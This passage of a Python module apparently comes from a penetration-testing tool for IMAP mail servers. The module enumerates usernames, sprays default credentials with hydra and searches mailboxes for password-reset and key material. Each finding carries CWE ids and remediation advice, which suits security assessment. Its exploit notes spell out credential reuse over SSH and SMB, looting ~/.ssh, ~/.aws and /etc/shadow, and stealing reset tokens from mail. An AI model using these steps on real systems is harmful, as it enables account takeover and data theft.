                        cwes, kind="imap_version_cve",
                        exploit_note=(
                            "searchsploit dovecot 2.3 ; for Dovecot: "
                            "https://dovecot.org/security.html for exact CVE ; do "
                            "NOT fire memory-corruption PoC in prod without ROE."),
                        depth_tier="t0"))
                    break

            # User enumeration hits (only when the sweep found asymmetry).
            enum = pr.get("enum") or {}
            if enum.get("distinguishes") and enum.get("existing"):
                users = enum["existing"]
                out.append(_finding(
                    "medium", "IMAP valid usernames enumerated via LOGIN differential",
                    tgt,
                    f"LOGIN responses differ for existing vs missing accounts. "
                    f"Valid accounts named by the sweep: {', '.join(users)}. These "
                    f"names now seed password-spray against SSH / SMB / AD / web.",
                    "hydra",
                    f"hydra -L users.txt -p '<pass>' imap://{h.ip}:{p.portid}",
                    "Return an identical NO response (and identical timing) for "
                    "every failed LOGIN regardless of user existence.",
                    ["CWE-203", "CWE-204"], kind="imap_user_enum"))

            # Credentialed follow-up.
            cred = pr.get("credentialed") or {}
            if cred.get("login") and cred.get("default_creds"):
                u = cred.get("user") or ""
                out.append(_finding(
                    "critical", "IMAP default / weak credentials accepted", tgt,
                    f"Login as '{u}' with a default-credential pair unlocked a "
                    "full mailbox session.",
                    "hydra",
                    f"hydra -l {u} -p <pass> imap://{h.ip}:{p.portid}",
                    "Reset the account to a unique high-entropy secret; audit "
                    "any other service the same identity has (mail servers often "
                    "share the AD identity across SMB / VPN / web SSO).",
                    ["CWE-521", "CWE-1392"], kind="imap_default_creds",
                    exploit_note=(
                        "Try the landed pair as: ssh <user>@IP ; smbclient -L "
                        "//IP -U '<user>%<pw>' ; then loot ~/.ssh, ~/.aws, "
                        "/etc/shadow if root-adjacent."),
                    depth_tier="t3"))
            if cred.get("login"):
                mb = cred.get("mailboxes") or {}
                boxes = mb.get("list") or []
                lsub = mb.get("lsub") or []
                if boxes or lsub or mb.get("namespace"):
                    detail = (f"LIST returned {len(boxes)} mailbox(es); "
                              f"LSUB returned {len(lsub)} subscribed folder(s).")
                    if mb.get("namespace"):
                        detail += f" NAMESPACE: {mb['namespace'][:200]}"
                    if boxes:
                        detail += "\n" + "\n".join(boxes[:10])
                    out.append(_finding(
                        "high", "IMAP mailbox inventory readable with credentials",
                        tgt, detail, "imap",
                        "# after LOGIN: a1 LIST \"\" \"*\"  ;  a2 LSUB \"\" \"*\"",
                        "Restrict shared / public mailboxes; audit ACLs (RFC 4314).",
                        ["CWE-863"], kind="imap_mailbox_access",
                        exploit_note=(
                            "python3 -c 'import imaplib; m=imaplib.IMAP4_SSL(\"IP\"); "
                            "m.login(u,p); print(m.list()); m.select(\"INBOX\"); "
                            "print(m.search(None,\"ALL\"))'"),
                        depth_tier="t3"))
                loot = cred.get("loot") or []
                if loot:
                    out.append(_finding(
                        "high", "IMAP inbox contains high-value loot hits", tgt,
                        f"{len(loot)} INBOX subject(s) match loot patterns "
                        "(password reset / VPN / SSH key / MFA):\n"
                        + "\n".join(loot[:10]),
                        "imap",
                        "# after LOGIN: SEARCH SUBJECT \"password reset\"",
                        "Educate users to delete transport-of-secret mail; enforce "
                        "MFA on downstream services so a mailbox read does not "
                        "yield a valid credential.",
                        ["CWE-200", "CWE-538"], kind="imap_loot_hits",
                        exploit_note=(
                            "After login: a1 SELECT INBOX ; a2 SEARCH SUBJECT "
                            "\"password reset\" ; a3 FETCH <seq> (BODY.PEEK[TEXT]) "
                            "to pull the reset token; use it on the origin service "
                            "before it expires."),
                        depth_tier="t4"))
    return out


# --- top-level analyze -----------------------------------------------------

def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "imap", _DEFAULT_PORT)


def runbook(ip: str, port: int) -> list[dict]:
    return [
        {"step": "Capabilities + STARTTLS + SASL",
         "cmd": f"openssl s_client -starttls imap -connect {ip}:{port}   # a1 CAPABILITY"},
        {"step": "Pre-auth ID (RFC 2971)",
         "cmd": f"nc {ip} {port}   # a1 ID NIL"},
        {"step": "Default-creds spray (bounded)",
         "cmd": f"hydra -L users.txt -P passes.txt imap://{ip}:{port}"},
    ]


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None, **_ignored) -> dict:
    """Full IMAP analysis. `creds` = {"user", "secret"} for a credentialed pass."""
    from . import svcprobe
    from ..creds.known_mail_accounts import (_mail_domain_for_host,
                                             record_mail_account)
    targets = imap_targets(hosts)
    by_ip = {h.ip: h for h in hosts}
    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if not pr or not pr.get("reachable"):
                if pr:
                    probes[(t["ip"], t["port"])] = pr
                continue
            # LOGIN-differential user enum: only meaningful when plaintext
            # LOGIN is actually processed (either accepted pre-TLS, or on 993
            # where TLS wraps every reply anyway).
            if (pr.get("plaintext_login") == "accepted"
                    or (t["port"] == 993 and not pr.get("preauth"))):
                try:
                    pr["enum"] = enum_users(t["ip"], t["port"])
                except OSError:
                    pass
                # Cross-transport wire: every LOGIN-differential hit lands on
                # the host as a mail-kind Account so smtp.py / pop3.py can
                # retry it via known_mail_accounts.
                host = by_ip.get(t["ip"])
                if host is not None:
                    dom = _mail_domain_for_host(host)
                    for u in (pr.get("enum") or {}).get("existing") or []:
                        record_mail_account(host, u, dom, "imap")
            # Credentialed follow-up: operator creds first, then a bounded
            # default-cred spray if none of them log in.
            login_pair = None
            used_defaults = False
            if creds and creds.get("user"):
                if try_login(t["ip"], t["port"],
                             creds["user"], creds.get("secret") or ""):
                    login_pair = (creds["user"], creds.get("secret") or "")
            if login_pair is None:
                hit = _spray_defaults(t["ip"], t["port"], creds, _TIMEOUT)
                if hit is not None:
                    login_pair = hit
                    used_defaults = True
            if login_pair is not None:
                cred_out = credentialed_probe(t["ip"], t["port"],
                                              login_pair[0], login_pair[1])
                cred_out["default_creds"] = used_defaults
                pr["credentialed"] = cred_out
            probes[(t["ip"], t["port"])] = pr
            t["banner"] = pr.get("banner", "")
            t["preauth"] = pr.get("preauth", False)
            t["starttls"] = pr.get("starttls", False)
            t["anonymous"] = pr.get("anonymous", False)
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
